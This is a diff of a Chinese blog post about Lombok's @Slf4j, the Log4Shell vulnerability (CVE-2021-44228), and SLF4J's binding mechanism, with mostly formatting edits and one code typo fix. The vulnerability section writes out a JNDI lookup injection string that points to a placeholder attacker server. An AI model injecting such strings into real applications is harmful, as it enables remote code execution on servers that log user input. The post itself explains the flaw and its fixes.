@@ -10,21 +10,30 @@ title: 从 Lombok 开始看 @Slf4j
 
 > 参考资料：
 > https://projectlombok.org/features/log
+>
 > https://github.com/projectlombok/lombok/issues/3063
+> 
 > 《深入理解 JVM 字节码》
+> 
 > 《深入理解 Java 虚拟机》
+> 
 > [blackhat 2016 年议题](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
+> 
 > https://docs.oracle.com/javase/tutorial/jndi/overview/index.html
+> 
 > [slf4j 官网](https://www.slf4j.org/manual.html)
+> 
 > [slf4j github](https://github.com/qos-ch/slf4j)
 
 # 引入
 
 2021 年 12 月，Apache Java模块Log4j库第一个远程代码执行漏洞被公开披露，该漏洞识别为CVE-2021-44228。此外，还陆续披露了漏洞——CVE-2021-45046和CVE-2021-45105。Log4j可能会成为现代网络安全史上最严重的漏洞。一旦漏洞被利用遭到入侵，服务器就可能会被劫持。
+
 ## 漏洞
 
 能攻击到服务器的 **漏洞代码**
 `${jndi:ldpa://xx.xx.xx.xx:xxx/xxx}` （ ldpa://恶意代码所在服务器 Ip /恶意代码类名），只需要将这行代码在任意会产生日志输出的输入框内输入就会在应用服务器上运行恶意代码
+
 ### 原理
 log4j 对于我们来说，最常使用的是用来输出一些变量等，但是 log4j 除了可以输出程序中的变量，它还提供了一个叫 Lookup 的东西，可以用来输出更多内容（系统变量，网络中的变量等）。
 Lookup 像是一个接口，具体去哪里查找，怎么查找需要具体模块的实现，而 log4j 已经帮我们把常见的查询途径都进行了实现。
@@ -33,15 +42,24 @@ Lookup 像是一个接口，具体去哪里查找，怎么查找需要具体模�
 
 
 **JNDI**
+
 Java naming dictionary interface （Java 命名和字典接口），像一个字典一样，通过名称去查询对应的对象
+
 Naming：命名服务，通过名称查找实际对象的服务，例如通过域名查询 IP 地址等
+
 Dictionary：名称服务的一种拓展，除了名称服务中已有的名称到对象的关联信息外，还允许拥有属性信息。
+
 在这图中，我们可以看到 SPI 是他的具体实现层。早在 2016年的时候就有人提出过一个议题"[A Journey From JNDI LDAP Manipulation To RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)"，指出当时会有安全问题，2016下半年，jdk 也进行了相关的修复，但是修复的只有 RMI 和 CORBA 方式，LDAP 仍有漏洞，直到此次被爆出。
+
 ![Pasted image 20230814075859.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/dataPasted%20image%2020230814075859.png)
 
+
 **LDPA**
+
 Lightweight Directory Access Protocol：轻量目录访问协议
+
 LDAP也是有client端和server端。server端是用来存放资源，client端用来操作增删改查等操作
+
 LDAP 类似于用一个树状结构将数据联系起来(和查询DNS服务挺类似的)层级搜索
 
 **过程**
@@ -52,12 +70,14 @@ LDAP 类似于用一个树状结构将数据联系起来(和查询DNS服务挺�
 
 **核心问题**
 Java 允许通过 JNDI 远程去下载一个 Class 文件来加载对象
+
 ### 修复
 ![截屏2023-08-14 14.54.35.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/data%E6%88%AA%E5%B1%8F2023-08-14%2014.54.35.png)
 
 1. 从2.17.0版本开始(Java 7和Java 6的2.12.3和2.3.1版本)，只有配置中的 lookup 字符串才会递归展开;在任何其他用法中，只解析顶级 lookup，而不解析任何嵌套 lookup。
 2. 启用 JNDI 的属性已经从`log4j2.ableleJndi`重命名为三个独立的属性: `log4j2.ableleJndiLookup`、`log4j2.ableleJndiJms`和`log4j2.ableleJndiContextSelector`
 3. JNDI 功能在这些版本中得到了加强: 2.3.1、2.12.2、2.12.3或2.17.0。从这些版本开始，对 LDAP 协议的支持已经被删除，只有 JAVA 协议在 JNDI 连接中得到支持。
+
 ## 对我们的影响
 对于我们来说，除了升级项目中 Log4j 的版本，是不是还需要进行其他的处理。
 
@@ -73,8 +93,12 @@ Java 允许通过 JNDI 远程去下载一个 Class 文件来加载对象
 
 > 参考
 > [blackhat 2016 年议题](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
+> 
 > https://docs.oracle.com/javase/tutorial/jndi/overview/index.html
+> 
 > [github 地址](https://github.com/projectlombok/lombok/issues/3063)
+
+
 # 作者说
 ![截屏2023-08-08 20.28.23.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/data%E6%88%AA%E5%B1%8F2023-08-08%2020.28.23.png)
 
@@ -89,7 +113,9 @@ Java 允许通过 JNDI 远程去下载一个 Class 文件来加载对象
 ## else
 ![截屏2023-08-08 20.47.05.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/data%E6%88%AA%E5%B1%8F2023-08-08%2020.47.05.png)
 
+
 在一个新建的 SpringBoot 项目中，我们也可以看到 lombok 的包是非常干净的，并没有引用其他组件
+
 # 为什么能这么做
 
 ## Lombok 做了什么
@@ -124,7 +150,7 @@ public static class AnnotationProcessor extends AbstractProcessor {
 			Class<?> mc = cl.loadClass("lombok.core.AnnotationProcessor");  
 			return (AbstractProcessor) mc.getDeclaredConstructor().newInstance();  
 		} catch (Throwable t) {  
-			if (t instanceof Error) th。ow (Error) t;  
+			if (t instanceof Error) throw (Error) t;  
 			if (t instanceof RuntimeException) throw (RuntimeException) t;  
 			throw new RuntimeException(t);  
 	}  
@@ -184,11 +210,13 @@ javac 对代码的编译过程如下图所示，在 parse和enter 这个阶段�
 
 > 参考资料：
 > 《深入了解 Java 虚拟机》 第 10.2.3 章
+> 
 > 《深入了解 JVM 字节码》 第 8 章
 
 ## Slf4j 做了什么
 
  lombok 的作用是帮我们生成下面这行代码，那么 Slf4j (simple logging facade for java)才是这行代码的处理者
+ 
  ```java
  private static final Logger log = LoggerFactory.getLogger(LogDemoApplication.class);
 ```
@@ -207,9 +235,13 @@ Slf4j 制定了 log 日志的使用标准，提供了高层次的接口，在使
 ### 源码
 从 getLogger 的方法一层层地跟踪，我们会发现最后会走到一个 bind 的方法，这个地方应该就是绑定具体实现框架的地方
 `LoggerFactory.getLogger(Class<?> clazz)`
+
 `LoggerFactory.getLogger(String name)`
+
 `LoggerFactory.getILoggerFactory()`
+
 `LoggerFactory.performInitialization()`
+
 `LoggerFactory.bind()`
 
 ```java
@@ -263,6 +295,7 @@ try {
 
 可以看到 StaticLoggerBinder 的实例是在真正日志实现框架包下的，所以当没有引入真正的日志实现框架时就会抛出 NoClassDefFoundError 异常。但是 SLF4J 的源码中没有 StaticLoggerBinder 又是怎么通过编译的，去看他的源码，会发现源代码中是有实现类的，只是在打包时通过排除了
 ### else
+
 1. Slf4j 提供了常用日志框架的桥接包，以及详细的文档描述，使用起来非常简单。在 slf4j 的官网中也有一张对具体的日志框架的支持图
 	![Pasted image 20230813141525.png](https://cdn.jsdelivr.net/gh/TongCodeSpace/picForBlog@master/dataPasted%20image%2020230813141525.png)
 
@@ -297,6 +330,7 @@ static Set<URL> findPossibleStaticLoggerBinderPathSet() {
 
 > 参考：
 > [slf4j 官网](https://www.slf4j.org/manual.html)
+> 
 > [slf4j github](https://github.com/qos-ch/slf4j)
 ## log4j 做了什么
 
